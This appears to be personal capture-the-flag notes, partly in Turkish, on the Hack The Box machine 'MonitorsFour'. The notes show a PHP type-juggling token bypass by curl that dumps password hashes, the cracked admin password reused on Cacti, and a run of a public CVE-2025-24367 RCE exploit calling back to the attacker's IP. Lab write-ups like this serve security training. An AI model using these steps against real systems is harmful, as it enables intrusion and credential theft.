

# HTB Monitors Four Linux Easy

# ip = `10.10.11.98`

-----------------------------------------------------------------------------------

# enum

```bash
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 889DCABDC39A9126364F6A675AA4167D
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

```

## ports: 80,5985

## names:
* nicola johnson : it manager
* glenn jones: CEO


## user full names
1   admin   Marcus Higgins  System Administrator    1978/04/26  2021/01/12  $320,800.00     
2   mwatson     Michael Watson  Website Administrator   1985/02/15  2021/05/11  $75,000.00  
3   janderson   Jennifer Anderson   Network Engineer    1990/07/16  2021/06/20  $68,000.00  
4   dthompson   David Thompson  Database Manager    1982/11/23  2022/09/15

-----------------------------------------------------------------------------------

# web 

## cacti.monitorsfour.htb
cacti version: 1.2.28


## monitorsfour.htb
login page: http://monitorsfour.htb/login

userpage: http://monitorsfour.htb/user
şyle cevap dnyor:
{"error":"Missing token parameter"}

http://monitorsfour.htb/user?token=aaaa
invalid token dnyor: demei "token" parametresi doğru


## PHP Type Juggling tip hokkabazlığı)

linedninden Furkan Taşcya danştm ve bana 0e1234 olayndan bahsetti.
bu nedir?

0e1234: php bu ifadeyi 0 zeri 1234 olara alglar ve bu 0'a eşittir.
bacendde şu şeilde bir kod varsa eğer:
```php
// Saldırganın gönderdiği token (Sizin curl ile yolladığınız)
$user_token = "0e1234";

// Veritabanındaki gerçek token (Sizin bilmediğiniz ama hash'i böyle olan)
$real_token = "0e8304..."; 

// GEVŞEK KARŞILAŞTIRMA (HATA BURADA)
if ($user_token == $real_token) {
    echo "Giriş Başarılı!";
}
```
== işaret gevşek (loose) compration yapar ve ikisi de 0 olara saylp if koşulu sağlanr.


```bash
curl -i "http://monitorsfour.htb/user?token=0e1234" 
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 10 Dec 2025 20:25:37 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Set-Cookie: PHPSESSID=ffdd25819b49b4c7962c3107819dd4e8; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"85d5fe076d4f496ceb","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

hashli cred var
## cred: `admin@monitorsfour.htb:56b32eb43e6f15395f6c46c1c9e1cd36`


```json
/usr/bin/cat json-from-monitors.txt| jq
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "e63fecffb39364093c",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```


crackstation ile kırdık:

## cred: `admin:wonderful1`
> http://monitorsfour.htb/admin/dashboard 
adresine admin userıyla girdik.



# API
> http://monitorsfour.htb/admin/api
dan kendimize api ürettik: `27c4133d783475b0b6`

31fd8a7ec5a7fe3906

bişi bulamadaım

## cacti.monitors.htb
wonderful1 password reuse var.
marcus denen adam admin ve
## cred: `marcus:wonderful1`

## CVE-2025-24367
> https://ubuntu.com/security/CVE-2025-24367
auth user RCE yapabiliyor.
> https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC


```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.78 -l 1401 --url http://cacti.monitorsfour.htb
```




-----------------------------------------------------------------------------------

# Initial access - www-data


passwqord bulma işler yapıldı. ama yok

user.txt okunabilri.
````bash
www-data@821fbd6a43fa:/home/marcus$ cat user.txt

d63cfe515d5ab1faccd86a3a57c96c42
```


-----------------------------------------------------------------------------------


-----------------------------------------------------------------------------------


-----------------------------------------------------------------------------------


-----------------------------------------------------------------------------------
